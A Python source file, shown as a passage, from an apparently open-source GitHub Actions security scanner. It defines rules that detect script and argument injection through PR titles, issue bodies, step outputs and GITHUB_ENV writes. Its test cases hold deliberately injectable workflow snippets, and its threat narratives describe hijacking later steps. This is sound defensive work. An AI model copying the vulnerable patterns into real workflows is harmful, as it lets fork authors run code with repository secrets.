"""GitHub Actions PPE extended rules — GITHUB_ENV/OUTPUT injection, insecure commands,
bot-actor spoofing, LOTP tools, secrets:inherit, if-always-true.

These rules cover attack vectors beyond the basic pull_request_target PPE detection.
Most are directly traceable to documented CVEs and real exploitation campaigns.
"""

import re

from taintly.models import (
    _YAML_BOOL_TRUE,
    ContextPattern,
    PathPattern,
    Platform,
    RegexPattern,
    Rule,
    SequencePattern,
    Severity,
)
from taintly.parsers.segmentation import for_each_step
from taintly.workflow_aware_pattern import PredicateContext

from .._build_tools import BUILD_TOOL_ANCHOR as _BUILD_TOOL_ANCHOR
from .sec3_sec4_supply_chain_ppe import _DANGEROUS_GITHUB_CONTEXT_RE


class _OutputToRunShellPattern:
    """Shared ``run:``-block sink walker: an output reference spliced into a
    shell context.  Subclasses set ``_OUTPUT_RE`` to the source shape; fires
    only when the interpolation lands in a ``run:`` shell parser (inline value
    or block-scalar body), not in a sibling YAML key.

    SEC4-GH-021 (step outputs) and SEC4-GH-022 (cross-job needs outputs) share
    this exact state machine — keeping it in ONE place means a fix to the
    block-scalar / dedent logic (the reformatting-evadable surface) can't
    half-land across two copies.
    """

    _OUTPUT_RE: re.Pattern[str]  # set by subclass
    _RUN_LINE_RE = re.compile(r"^\s*(?:-\s+)?run\s*:\s*(.*)$")

    def check(self, _content: str, lines: list[str]) -> list[tuple[int, str]]:
        results: list[tuple[int, str]] = []
        in_run_block = False
        run_indent = 0
        for i, line in enumerate(lines):
            stripped = line.lstrip(" \t")
            if not stripped or stripped.startswith("#"):
                continue
            indent = len(line) - len(stripped)
            if in_run_block and indent <= run_indent:
                in_run_block = False
            m = self._RUN_LINE_RE.match(line)
            if m:
                value = m.group(1).strip()
                if value in {"|", "|-", "|+", ">", ">-", ">+"}:
                    in_run_block = True
                    run_indent = indent
                    continue
                if self._OUTPUT_RE.search(value):
                    results.append((i + 1, line.strip()))
                continue
            if in_run_block and self._OUTPUT_RE.search(line):
                results.append((i + 1, line.strip()))
        return results


class StepOutputShellInterpolationPattern(_OutputToRunShellPattern):
    """SEC4-GH-021: ``${{ steps.X.outputs.Y }}`` spliced into a shell context.
    Supports dot-form (``outputs.Y``) and bracket-form (``outputs['Y']``)."""

    _OUTPUT_RE = re.compile(
        r"\$\{\{\s*steps\.[\w-]+\.outputs(?:\.[\w-]+|\[['\"][^'\"]+['\"]\])\s*\}\}"
    )


# ---------------------------------------------------------------------------
# SEC4-GH-008 helpers — path-aware predicate.
#
# Sample-and-label of 30 corpus fires found 17/30 (57%) FP, all
# concentrated in path-shape false positives the previous regex form
# could not see: ``env:`` multi-expression concatenations,
# job/step ``name:`` strings, ``concurrency.group:``, and ``with:``
# slots whose action consumes them as plain strings (artifact name,
# PR title, branch name, etc.).
#
# The threat shape is shell-source splicing — a value spliced into
# bash / PowerShell / JS / inline-shell input where the runtime
# parses metacharacters before quoting protects the value.  Path-
# aware detection keeps every TP shape and drops every FP shape.
# ---------------------------------------------------------------------------

# Shell-form ``${{ inputs.X }}`` / ``${{ github.event.inputs.X }}``
# reference inside a scalar value.
_INPUTS_REF_RE_PRED = re.compile(
    r"\$\{\{\s*(?:github\.event\.inputs|inputs)\.[a-zA-Z0-9_]+\s*\}\}",
    re.IGNORECASE,
)

# (action, with-slot) pairs whose value the action passes to a shell /
# script / interpreter at runtime.  Splicing ``${{ inputs.X }}`` into
# these slots is shell-source splicing of attacker-controlled bytes,
# same threat shape as ``run: echo ${{ inputs.X }}``.
#
# All other ``with:`` slots accept plain strings (artifact name, PR
# title, branch ref, etc.) and are NOT shell sinks for this rule's
# threat model.  Keep this list small and explicit; broadening
# changes the rule's false-positive boundary.
_SHELL_EXECUTING_ACTION_SLOTS: frozenset[tuple[str, str]] = frozenset(
    {
        # GitHub-published — the Octokit script runs the value as JS.
        ("actions/github-script", "script"),
        # nick-fields/retry — three slots all eval a shell command.
        ("nick-fields/retry", "command"),
        ("nick-fields/retry", "new_command"),
        ("nick-fields/retry", "on_retry_command"),
        # Azure inline-script slots (case variants seen in the wild).
        ("azure/CLI", "inlineScript"),
        ("azure/cli", "inlineScript"),
        ("azure/powershell", "inlineScript"),
        # SSH / remote-shell action families.
        ("appleboy/ssh-action", "script"),
        ("garygrossgarten/github-action-ssh", "command"),
    }
)


def _action_name_for_slot(uses_value: str) -> str:
    """Drop the ``@<ref>`` suffix and any sub-action path beyond the
    second ``/`` so ``github/codeql-action/init@v3`` resolves to
    ``github/codeql-action`` (matches the lookup key in
    ``_SHELL_EXECUTING_ACTION_SLOTS``)."""
    if not uses_value:
        return ""
    head = uses_value.split("@", 1)[0].strip()
    parts = head.split("/")
    if len(parts) >= 2:
        return f"{parts[0]}/{parts[1]}"
    return head


def _is_dispatch_input_in_shell_sink(
    value: str,
    _value_kind: str,
    path: tuple[object, ...],
    ctx: PredicateContext,
) -> bool:
    """Predicate for SEC4-GH-008 — path-aware form.

    Fires when an ``${{ inputs.X }}`` / ``${{ github.event.inputs.X }}``
    reference reaches a shell sink:

    * ``jobs.<job>.steps[<i>].run`` — direct shell body.
    * ``jobs.<job>.steps[<i>].with.<slot>`` where the step's
      ``uses:`` action is in ``_SHELL_EXECUTING_ACTION_SLOTS`` for
      that slot (shell-executing action input).

    Everything else (env-block, name, concurrency.group,
    string-only ``with:`` slots) is path-shape FP — those values
    never reach a shell parser, so the threat model doesn't apply.
    """
    if not _INPUTS_REF_RE_PRED.search(value or ""):
        return False
    # Comment-prefixed shell lines (inside ``run: |`` block scalars,
    # the predicate is invoked per body line; a leading ``#`` is a
    # shell comment — value won't execute).  Mirrors the original
    # RegexPattern's ``^\s*#`` exclude.
    if value.lstrip().startswith("#"):
        return False
    if (
        len(path) >= 5
        and path[0] == "jobs"
        and path[2] == "steps"
        and isinstance(path[3], int)
        and path[-1] == "run"
    ):
        return True
    if (
        len(path) == 6
        and path[0] == "jobs"
        and path[2] == "steps"
        and isinstance(path[3], int)
        and path[4] == "with"
        and isinstance(path[5], str)
    ):
        slot = path[5]
        uses = ctx.step_uses(path) or ""
        action_name = _action_name_for_slot(uses)
        if (action_name, slot) in _SHELL_EXECUTING_ACTION_SLOTS:
            return True
    return False


class GithubScriptDangerousContextPattern:
    """SEC4-GH-025: attacker-controlled GitHub context interpolated
    into an ``actions/github-script`` step's ``script:`` body.

    ``actions/github-script`` evaluates its ``script:`` parameter
    as JavaScript via an eval-style mechanism.  When ``${{ ... }}``
    is interpolated into a JS string literal inside that script,
    attacker bytes containing ``'``, ``\\n``, or ``${...}`` can
    break out of the string and execute arbitrary JavaScript in
    the runner — with whatever permissions the workflow has bound
    (often write).

    Sibling of SEC4-GH-004 (``run:`` direct interpolation).  Same
    dangerous-context source set, different sink: github-script's
    ``script:`` parameter rather than a shell ``run:`` block.

    Walker locates ``uses: actions/github-script@...`` steps,
    finds the ``script:`` key inside the same step's ``with:``,
    and matches dangerous-context regexes inside the script
    body (block-scalar or inline form).

    The dangerous-context regex is kept in sync with SEC4-GH-004's
    ``_DANGEROUS_GITHUB_CONTEXT_RE`` — anything that's attacker-
    controllable in a ``run:`` context is also attacker-
    controllable in a github-script context.
    """

    _USES_RE = re.compile(r"^\s*(?:-\s*)?uses\s*:\s*actions/github-script[@/]")
    _WITH_LINE_RE = re.compile(r"^\s*with\s*:\s*(?:#.*)?$")
    _SCRIPT_LINE_RE = re.compile(r"^\s*script\s*:\s*(.*)$")
    _DANGEROUS_RE = re.compile(
        r"\$\{\{\s*github\.("
        r"event\.("
        r"issue\.(title|body)|"
        r"pull_request\.(title|body|head\.(ref|label)|user\.login)|"
        r"comment\.body|"
        r"review\.body|"
        r"head_commit\.(message|author\.(email|name))|"
        r"commits|"
        r"pages|"
        r"workflow_run\.head_branch|"
        r"base_ref"
        # ``github.event.inputs.*`` removed to re-sync with the canonical
        # ``_DANGEROUS_GITHUB_CONTEXT_RE`` (which intentionally excludes it,
        # owned by SEC4-GH-008's workflow-dispatch calibration). Dispatch
        # inputs require write access to set, so they are maintainer-
        # controlled, not attacker-controlled. Top-level ``inputs.*``
        # (reusable-workflow caller taint) stays covered by ``_INPUTS_RE``.
        r")|"
        r"head_ref"
        r")"
    )
    # ``inputs.*`` (workflow_call / dispatch) at top-level — round-2
    # v1 occasion #20 (backport-base) confirms this transit.
    _INPUTS_RE = re.compile(r"\$\{\{\s*inputs\.[A-Za-z0-9_-]+\s*\}\}")

    def _is_dangerous(self, line: str) -> bool:
        return bool(self._DANGEROUS_RE.search(line) or self._INPUTS_RE.search(line))

    def check(self, _content: str, lines: list[str]) -> list[tuple[int, str]]:
        """Walk lines looking for github-script steps; for each,
        find the script: body and match dangerous-context regexes.
        """
        results: list[tuple[int, str]] = []
        i = 0
        n = len(lines)
        while i < n:
            line = lines[i]
            if not self._USES_RE.match(line):
                i += 1
                continue
            # Found a github-script step.  Determine the step's
            # body indent (the column of `uses:`).  Sibling keys
            # of the step (``name:``, ``with:``, ``env:``, ``id:``,
            # ``if:``) appear at the SAME indent as ``uses:`` — they
            # don't mark the step boundary.  A new sibling step
            # under ``steps:`` starts with ``- `` at a SHALLOWER
            # indent (the list-item indent), and a key at strictly
            # shallower indent means we've left the step entirely.
            step_indent = len(line) - len(line.lstrip(" \t"))
            j = i + 1
            in_with_block = False
            with_indent = 0
            while j < n:
                jline = lines[j]
                jstripped = jline.lstrip(" \t")
                if not jstripped or jstripped.startswith("#"):
                    j += 1
                    continue
                jindent = len(jline) - len(jstripped)
                # Strictly shallower indent than the step body = left the step.
                if jindent < step_indent:
                    break
                # New sibling step under ``steps:`` — same or shallower
                # indent AND starts with ``- ``.  Equal-indent sibling
                # keys (``with:``, ``env:``, etc.) start with a letter,
                # not ``- ``.
                if jstripped.startswith("- ") and jindent <= step_indent:
                    break
                if in_with_block and jindent <= with_indent:
                    in_with_block = False
                if self._WITH_LINE_RE.match(jline):
                    in_with_block = True
                    with_indent = jindent
                    j += 1
                    continue
                if not in_with_block:
                    j += 1
                    continue
                m = self._SCRIPT_LINE_RE.match(jline)
                if m:
                    inline_value = m.group(1).strip()
                    if inline_value in {"|", "|-", "|+", ">", ">-", ">+"}:
                        # Block-scalar script body — walk until indent
                        # drops back to script_indent or shallower.
                        script_indent = jindent
                        k = j + 1
                        while k < n:
                            kline = lines[k]
                            kstripped = kline.lstrip(" \t")
                            if not kstripped:
                                k += 1
                                continue
                            kindent = len(kline) - len(kstripped)
                            if kindent <= script_indent:
                                break
                            # NB: do NOT skip ``#``/``//``-prefixed lines
                            # here.  ``${{ }}`` is interpolated by the
                            # Actions runner into the script source
                            # *before* the JS engine runs, so a JS
                            # comment cannot neutralise it — a
                            # newline-bearing attacker source breaks out
                            # onto a fresh, uncommented line.  The FP
                            # simulator's ``comment_embed`` hit on this
                            # pattern is an artifact; it is skipped in
                            # ``fp_simulator._SKIP_PATTERN_TYPES`` instead.
                            if self._is_dangerous(kline):
                                results.append((k + 1, kline.strip()))
                            k += 1
                        j = k
                        continue
                    # Inline form: `script: <expr>` on one line.
                    if inline_value and self._is_dangerous(inline_value):
                        results.append((j + 1, jline.strip()))
                j += 1
            i = j
        return results


class ReusableWorkflowSecretsInheritPattern:
    """Classify ``secrets: inherit`` by the reusable workflow callee.

    Same-repository reusable workflows (``uses: ./.github/workflows/...``)
    are still broad secret propagation, but the caller and callee are
    controlled by the same repository. Cross-repository reusable workflow
    calls hand every caller secret to another repository and retain the
    original high-severity SEC4-GH-012 signal.
    """

    _SECRETS_INHERIT_RE = re.compile(r"^\s*secrets:\s*inherit\s*(#.*)?$")
    # Block form: ``secrets:`` on its own line, ``inherit`` on the next.
    _SECRETS_BLOCK_RE = re.compile(r"^(\s*)secrets:\s*(#.*)?$")
    _INHERIT_ONLY_RE = re.compile(r"^\s*inherit\s*(#.*)?$")
    _USES_RE = re.compile(r"^\s*uses\s*:\s*(.+?)\s*(#.*)?$")

    def __init__(self, *, local: bool) -> None:
        self.local = local

    def _is_inherit_at(self, lines: list[str], i: int) -> bool:
        """True if line ``i`` is ``secrets: inherit`` inline, OR the
        ``secrets:`` line of a YAML block form (``secrets:`` then an
        indented ``inherit`` on the next meaningful line). The block form
        is valid YAML the inline-only regex missed — a
        reformatting-evadable recall gap."""
        line = lines[i]
        if self._SECRETS_INHERIT_RE.match(line):
            return True
        m = self._SECRETS_BLOCK_RE.match(line)
        if not m:
            return False
        sec_indent = len(m.group(1))
        for j in range(i + 1, len(lines)):
            nxt = lines[j]
            ns = nxt.lstrip(" \t")
            if not ns or ns.startswith("#"):
                continue
            nindent = len(nxt) - len(ns)
            # First meaningful child must be an indented bare ``inherit``;
            # a ``secrets:`` introducing an explicit map is correctly ignored.
            return nindent > sec_indent and bool(self._INHERIT_ONLY_RE.match(nxt))
        return False

    def check(self, _content: str, lines: list[str]) -> list[tuple[int, str]]:
        results: list[tuple[int, str]] = []
        for i, line in enumerate(lines):
            stripped = line.lstrip(" \t")
            if stripped.startswith("#") or not self._is_inherit_at(lines, i):
                continue
            callee = self._find_sibling_uses(lines, i)
            is_local = callee.startswith("./")
            if is_local == self.local:
                results.append((i + 1, line.strip()))
        return results

    def _find_sibling_uses(self, lines: list[str], secrets_idx: int) -> str:
        secrets_line = lines[secrets_idx]
        secrets_indent = len(secrets_line) - len(secrets_line.lstrip(" \t"))
        job_start = 0
        job_end = len(lines)
        for j in range(secrets_idx - 1, -1, -1):
            candidate = lines[j]
            stripped = candidate.lstrip(" \t")
            if not stripped or stripped.startswith("#"):
                continue
            indent = len(candidate) - len(stripped)
            if indent < secrets_indent:
                job_start = j + 1
                break
        for j in range(secrets_idx + 1, len(lines)):
            candidate = lines[j]
            stripped = candidate.lstrip(" \t")
            if not stripped or stripped.startswith("#"):
                continue
            indent = len(candidate) - len(stripped)
            if indent < secrets_indent:
                job_end = j
                break
        for j in range(job_start, job_end):
            candidate = lines[j]
            stripped = candidate.lstrip(" \t")
            if not stripped or stripped.startswith("#"):
                continue
            indent = len(candidate) - len(stripped)
            if indent != secrets_indent:
                continue
            m = self._USES_RE.match(candidate)
            if m:
                return m.group(1).strip().strip("'\"")
        return ""


_PRT_TRIGGER_RE = (
    r"(?m)("
    r"^\s*pull_request_target\s*:"
    r"|^\s*-\s*pull_request_target\s*$"
    r"|^on\s*:\s*pull_request_target\s*$"
    r"|^on\s*:\s*\[[^\]]*\bpull_request_target\b[^\]]*\]"
    r")"
)


_IGNORE_SCRIPTS_INSTALL_LINE_RE = (
    r"^\s*(?:-\s*)?(?:run:\s*)?"
    r"[\"']?"
    r"(?:npm\s+(?:install|ci|i)|pnpm\s+(?:install|i)|yarn(?:\s+install)?)\b"
    r"(?=[^#&;|`]*--ignore-scripts(?:\s|[\"']|$))"
    r"(?![^#&;|`]*--ignore-scripts(?:=|\s+)false\b)"
    r"(?!.*(?:&&|&|;|\|\||\||`))"
)


# Non-injectable GitHub context fields: server-minted IDs/hashes whose values
# are integers or [0-9a-f] hex — they cannot carry shell metacharacters, a
# quote, or a newline, so interpolating them into a shell / JS / reusable-
# workflow input is NOT script injection regardless of who triggered the run.
# Distinct from the attacker-controllable free-text fields (PR title / body /
# branch name / comment) the script-injection rules target.  These are the
# fields the v2 field-precision sample repeatedly flagged as FP sources
# (``github.event.number``, ``github.run_id``, ``github.sha``).  Anchored on a
# trailing word boundary so ``number`` does not also swallow a hypothetical
# ``number_label`` free-text field.
_NONINJECTABLE_CONTEXT_FIELD_RE = (
    r"github\.("
    r"sha|run_id|run_number|run_attempt|job|workflow_sha"
    r"|event\.(number|"
    r"(pull_request|issue|discussion|review|comment)\.(number|id)"
    r"|installation\.id|sender\.id"
    r")"
    r")\b"
)

# A line whose ONLY ``github.event.*`` (or top-level ``github.*``) interpolation
# is a non-injectable numeric/hex ID: the line interpolates such a field AND
# contains no OTHER ``github.*`` reference whose tail is a free-text field.  Used
# as a line-level exclude on rules that anchor broadly on ``github.event.*`` —
# it suppresses the numeric-ID FP without touching the free-text TP path (a line
# mixing ``github.event.number`` with ``github.event.pull_request.title`` still
# fires because the title reference is not covered by the non-injectable set).
_NONINJECTABLE_ONLY_LINE_RE = (
    # Anchor both zero-width assertions at the START of the line so ``re.search``
    # cannot slide ``.*`` past a free-text ``github.*`` reference and still
    # satisfy the negative lookahead at a later position.
    r"^"
    # Has at least one non-injectable github field …
    r"(?=.*" + _NONINJECTABLE_CONTEXT_FIELD_RE + r")"
    # … and no github reference that is NOT in the non-injectable set.  A
    # ``github.<x>`` whose continuation is not one of the non-injectable tails
    # is treated as potentially injectable, so the line is left to fire.
    r"(?!.*github\.(?!"
    r"sha\b|run_id\b|run_number\b|run_attempt\b|job\b|workflow_sha\b"
    r"|event\.number\b"
    r"|event\.(?:pull_request|issue|discussion|review|comment)\.(?:number|id)\b"
    r"|event\.installation\.id\b|event\.sender\.id\b"
    r"))"
)


class GithubScriptStepOutputPattern(GithubScriptDangerousContextPattern):
    """SEC4-GH-024: opaque step output interpolated into github-script.

    This uses the same sink walker as SEC4-GH-025 but keeps the source
    calibrated like SEC4-GH-021/022: a step output may carry attacker
    bytes, but the upstream producer is not visible at the consuming
    ``script:`` line, so the finding is review-needed.
    """

    _STEP_OUTPUT_RE = re.compile(
        r"\$\{\{\s*steps\.[\w-]+\.outputs(?:\.[\w-]+|\[['\"][^'\"]+['\"]\])\s*\}\}"
    )

    def _is_dangerous(self, line: str) -> bool:
        return bool(self._STEP_OUTPUT_RE.search(line))


class NeedsOutputShellInterpolationPattern(_OutputToRunShellPattern):
    """SEC4-GH-022: ``${{ needs.<job>.outputs.<name> }}`` spliced
    into a shell context.  Cross-job sibling of SEC4-GH-021 —
    same walker shape, scoped at the workflow level rather than
    the job level.  Job A's ``outputs:`` carry attacker-derived
    bytes (a step in A read a PR title, file content, branch
    name, etc.), Job B references those outputs via
    ``needs.A.outputs.X`` in a ``run:`` block.  Threat is
    identical to SEC4-GH-021's same-job transit, just across the
    needs-graph boundary.

    Round-2 v1 evidence (docs/field-validation/round-2/
    sec4-gh-004-template-injection-gap.md): 4 of 11 confirmed
    real misses against zizmor's ``template-injection`` audit
    share this shape (36% of TPs).
    """

    _OUTPUT_RE = re.compile(
        r"\$\{\{\s*needs\.[\w-]+\.outputs(?:\.[\w-]+|\[['\"][^'\"]+['\"]\])\s*\}\}"
    )


# Command-argument-style ``with:`` input keys: an action receiving one of
# these passes the value into a command's argv, so an attacker-controlled
# value there is *argument injection* (extra flags/options), not the shell
# metacharacter injection SEC4-GH-004 covers.  ``ref``/``sha`` are
# deliberately excluded — untrusted checkout refs are PPE owned by the
# checkout rules, and flagging them here would double-fire on the
# ubiquitous ``with: ref: ${{ ...head.sha }}`` pattern.
_ARG_INPUT_KEY_RE = re.compile(
    r"^\s*(args|arguments|command|cmd|options|opts|flags|entrypoint)\s*:\s*(.+?)\s*$",
    re.IGNORECASE,
)


class ArgumentInjectionInWithPattern:
    """Fire when an action step (``uses:``) passes an attacker-controlled
    GitHub context into a command-argument ``with:`` input
    (``args``/``command``/``flags``/…).

    Distinct from SEC4-GH-004, whose path filter is ``**.run`` (shell
    strings only): a value handed to an action as an argument never
    appears in a ``run:`` block, so this is a genuine coverage gap.  The
    attacker-controlled contexts are detected with the shared
    :data:`_DANGEROUS_GITHUB_CONTEXT_RE` (which already excludes
    ``inputs.*`` — owned by SEC4-GH-008 — so the two never overlap)."""

    def check(self, content: str, _lines: list[str]) -> list[tuple[int, str]]:
        results: list[tuple[int, str]] = []
        for step in for_each_step(content):
            if "uses:" not in step.text:
                continue
            for offset, line in enumerate(step.body_lines):
                if line.lstrip().startswith("#"):
                    continue
                m = _ARG_INPUT_KEY_RE.match(line)
                if not m:
                    continue
                if _DANGEROUS_GITHUB_CONTEXT_RE.search(m.group(2)):
                    results.append((step.start_line + offset, line.strip()))
        return results


RULES: list[Rule] = [
    # =========================================================================
    # SEC4-GH-028: argument injection via a command-arg with: input
    # =========================================================================
    Rule(
        id="SEC4-GH-028",
        title="Attacker-controlled context flows into an action's command-argument input",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        finding_family="script_injection",
        description=(
            "A step that ``uses:`` an action passes an attacker-controlled "
            "GitHub context (a PR title, issue body, head ref, commit "
            "message, …) into a command-argument-style ``with:`` input "
            "such as ``args``, ``command``, ``flags`` or ``entrypoint``. "
            "The action forwards that value into a command line, so the "
            "attacker can inject extra flags/options — argument injection. "
            "This is distinct from SEC4-GH-004 (shell injection in ``run:`` "
            "blocks): the value never touches a shell string, it is handed "
            "straight to the action's argv."
        ),
        pattern=ArgumentInjectionInWithPattern(),
        remediation=(
            "Never pass a raw ``${{ github.event.* }}`` context into an "
            "action's argument input. Stage it through an ``env:`` var and "
            "let the action read the env var, or validate/allow-list the "
            "value first:\n"
            "\n"
            "    - uses: some/action@<sha>\n"
            "      env:\n"
            "        TITLE: ${{ github.event.pull_request.title }}\n"
            "      with:\n"
            '        args: --title "$TITLE"   # quoted, from env\n'
        ),
        reference="https://securitylab.github.com/resources/github-actions-untrusted-input/",
        test_positive=[
            "on: pull_request_target\n"
            "jobs:\n  x:\n    steps:\n"
            "      - uses: docker://alpine\n"
            "        with:\n"
            "          args: ${{ github.event.pull_request.title }}\n",
            "on: pull_request_target\n"
            "jobs:\n  x:\n    steps:\n"
            "      - uses: some/runner@v1\n"
            "        with:\n"
            "          command: deploy ${{ github.event.issue.body }}\n",
        ],
        test_negative=[
            # Argument is a static/safe value.
            "on: pull_request_target\n"
            "jobs:\n  x:\n    steps:\n"
            "      - uses: some/action@v1\n        with:\n          args: --verbose\n",
            # The classic checkout ref pattern must NOT fire here (PPE owns it).
            "on: pull_request_target\n"
            "jobs:\n  x:\n    steps:\n"
            "      - uses: actions/checkout@v4\n"
            "        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n",
            # Dangerous context in a run: block is SEC4-GH-004's job, not ours.
            "on: pull_request_target\n"
            "jobs:\n  x:\n    steps:\n"
            "      - run: echo ${{ github.event.pull_request.title }}\n",
            # inputs.* is SEC4-GH-008's domain — excluded by the shared regex.
            "on: pull_request_target\n"
            "jobs:\n  x:\n    steps:\n"
            "      - uses: some/action@v1\n"
            "        with:\n          args: ${{ github.event.inputs.mode }}\n",
        ],
        stride=["T"],
        threat_narrative=(
            "An action's argument input is a command line in disguise. A "
            "fork PR author who controls the title or body can smuggle "
            "extra flags into the tool the action runs — changing its "
            "output path, enabling a dangerous mode, or pivoting to code "
            "execution — without ever needing a shell metacharacter, so a "
            "``run:``-focused injection check never sees it."
        ),
    ),
    # =========================================================================
    # SEC4-GH-006: GITHUB_ENV injection — CRITICAL
    # =========================================================================
    Rule(
        id="SEC4-GH-006",
        title="Attacker-controlled value written to GITHUB_ENV",
        severity=Severity.CRITICAL,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "Attacker-controlled GitHub context value (PR title, issue body, head_ref, etc.) "
            "is written directly to $GITHUB_ENV. This sets environment variables for ALL "
            "subsequent steps — equivalent to arbitrary code execution. "
            "Any step after this can read the injected variable, including privileged deploy steps."
        ),
        pattern=RegexPattern(
            match=(
                # Span bounded ({0,512}) so an adversarial ${{-heavy blob
                # can't drive quadratic backtracking. Real Actions
                # expressions are far shorter, so this is behavior-
                # preserving on true positives. See test_redos_bounds.py.
                r"\$\{\{[^}]{0,512}"
                r"(event\.(issue\.(title|body)|pull_request\.(title|body)|comment\.body"
                r"|head_commit\.message|review\.body)|head_ref)"
                r"[^}]{0,512}\}\}[^#\n]*>>\s*\$GITHUB_ENV"
            ),
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Never interpolate attacker-controlled ${{ github.* }} values directly\n"
            "into a run: block that writes to $GITHUB_ENV — they persist across\n"
            "every subsequent step.  Move the value through an env: key and\n"
            "sanitize with Bash parameter expansion at the write site:\n"
            "  env:\n    SAFE_TITLE: ${{ github.event.pull_request.title }}\n"
            '  run: echo "TITLE=${SAFE_TITLE//[^a-zA-Z0-9 _-]/}" >> $GITHUB_ENV\n'
            "Run `taintly --guide SEC4-GH-006` for the full checklist."
        ),
        reference="https://securitylab.github.com/resources/github-actions-untrusted-input/",
        test_positive=[
            '        run: echo "TITLE=${{ github.event.pull_request.title }}" >> $GITHUB_ENV',
            '        run: echo "BRANCH=${{ github.head_ref }}" >> $GITHUB_ENV',
            '        run: echo "BODY=${{ github.event.issue.body }}" >> $GITHUB_ENV',
        ],
        test_negative=[
            '        run: echo "BUILD=production" >> $GITHUB_ENV',
            '        run: echo "TITLE=$SAFE_TITLE" >> $GITHUB_ENV',
            '        # run: echo "TITLE=${{ github.event.pull_request.title }}" >> $GITHUB_ENV',
        ],
        stride=["E", "T"],
        threat_narrative=(
            "Writing attacker-controlled values to $GITHUB_ENV sets environment variables inherited "
            "by every subsequent step, including privileged deployment steps — equivalent to arbitrary "
            "remote configuration of the entire remaining workflow. "
            "An attacker can inject PATH overrides, LD_PRELOAD values, or tool path overrides to "
            "hijack every command that runs after the injection point."
        ),
        incidents=["Ultralytics (Dec 2024)"],
    ),
    # =========================================================================
    # SEC4-GH-007: GITHUB_OUTPUT injection — HIGH
    # =========================================================================
    Rule(
        id="SEC4-GH-007",
        title="Attacker-controlled value written to GITHUB_OUTPUT",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "Attacker-controlled GitHub context value written directly to $GITHUB_OUTPUT. "
            "Step outputs can be consumed by subsequent steps and jobs. If a downstream step "
            "uses this output in a shell command or another $GITHUB_ENV write, it enables "
            "chained injection."
        ),
        pattern=RegexPattern(
            match=(
                # Span bounded ({0,512}) so an adversarial ${{-heavy blob
                # can't drive quadratic backtracking. Real Actions
                # expressions are far shorter, so this is behavior-
                # preserving on true positives. See test_redos_bounds.py.
                r"\$\{\{[^}]{0,512}"
                r"(event\.(issue\.(title|body)|pull_request\.(title|body)|comment\.body"
                r"|head_commit\.message)|head_ref)"
                r"[^}]{0,512}\}\}[^#\n]*>>\s*\$GITHUB_OUTPUT"
            ),
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Validate and sanitize attacker-controlled values before writing to $GITHUB_OUTPUT.\n"
            "Prefer using env vars as intermediaries and strip shell metacharacters."
        ),
        reference="https://securitylab.github.com/resources/github-actions-untrusted-input/",
        test_positive=[
            '        run: echo "branch=${{ github.head_ref }}" >> $GITHUB_OUTPUT',
            '        run: echo "title=${{ github.event.pull_request.title }}" >> $GITHUB_OUTPUT',
        ],
        test_negative=[
            '        run: echo "result=success" >> $GITHUB_OUTPUT',
            '        run: echo "sha=${{ github.sha }}" >> $GITHUB_OUTPUT',
            '        # run: echo "title=${{ github.event.pull_request.title }}" >> $GITHUB_OUTPUT',
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Step outputs from attacker-controlled context values propagate to downstream steps "
            "that may use them in shell commands, creating a two-step injection chain that crosses "
            "the step boundary. "
            "The tainted value arrives at the downstream shell command still carrying its original "
            "metacharacters, enabling the same injection as writing the context value directly "
            "into a run: block."
        ),
    ),
    # =========================================================================
    # SEC4-GH-008: workflow_dispatch inputs used directly in run block — HIGH
    # =========================================================================
    Rule(
        id="SEC4-GH-008",
        title="workflow_dispatch inputs used directly in shell (not via env var)",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "workflow_dispatch input values (${{ inputs.* }} or ${{ github.event.inputs.* }}) "
            "used directly in workflow expressions outside of a safe env: assignment. "
            "Manually triggered inputs are user-controlled and may contain shell metacharacters. "
            "Exploited in the Langflow and Ultralytics supply chain incidents (2024-2025)."
        ),
        pattern=RegexPattern(
            match=r"\$\{\{\s*(github\.event\.inputs|inputs)\.[a-zA-Z0-9_-]+\s*\}\}",
            # ``${{ inputs.* }}`` inside a with:/env: block is an action input or
            # env assignment (incl. github-script's script: arg), NOT this
            # workflow's shell — mask those block bodies. Only run: shell fires.
            github_with_env_block_aware=True,
            exclude=[
                r"^\s*#",
                r"^\s*if:",
                # Exclude lines where ${{ inputs.* }} is the entire value of a YAML key.
                # env: MY_VAR: ${{ inputs.x }} is the RECOMMENDED safe pattern — don't flag it.
                # with: param: ${{ inputs.x }} passes a string to an action, not a shell command.
                r"""^\s*[\w.-]+:\s*["']?\$\{\{[^}]*\}\}["']?\s*(#.*)?$""",
                # Multi-interpolation in metadata-only YAML keys.  These keys
                # are display strings, concurrency-group keys, or scalar
                # action inputs — they never reach a shell from the
                # workflow itself.  The single-interpolation form is caught
                # by the line above; this entry covers values with multiple
                # interpolations or interleaved literal text (e.g.
                # ``name: ${{ matrix.os }}-${{ inputs.suite }}``,
                # ``group: deploy-${{ inputs.env }}``).  The allowed body
                # alphabet covers prose punctuation that appears in display
                # labels — word chars, slashes, dots, dashes, underscores,
                # spaces, parens/brackets, AND quotes/colons/commas/``#`` —
                # but still excludes the shell metacharacters that would make
                # the value executable if it ever reached a shell (`;`, `&`,
                # `|`, `$(`, backticks, `<`, `>`, `{`, `}` outside the
                # interpolation).  A step ``name:`` with an embedded
                # ``'${{ inputs.x }}'`` (quotes for readability) is a pure
                # display string GitHub never executes — field-precision FP
                # S056 (aws/karpenter e2e-cleanup.yaml step name).  Quotes are
                # added to the body alphabet so prose-with-quotes labels are
                # recognised; the key allowlist below is the audited
                # "not executed" set.
                r"""^\s*(?:-\s+)?(?:name|group|title|body|tag_name|commit-message"""
                r"""|repository|ref|branch|head|base)\s*:\s*['"]?"""
                r"""(?:[\w./_\- ()\[\]'":,#!?@%+=]*\$\{\{[^}]+\}\})+"""
                r"""[\w./_\- ()\[\]'":,#!?@%+=]*['"]?\s*(#.*)?$""",
            ],
        ),
        remediation=(
            "Never interpolate ${{ inputs.* }} directly into a run: body\n"
            "— the value is spliced into shell source before parsing, so\n"
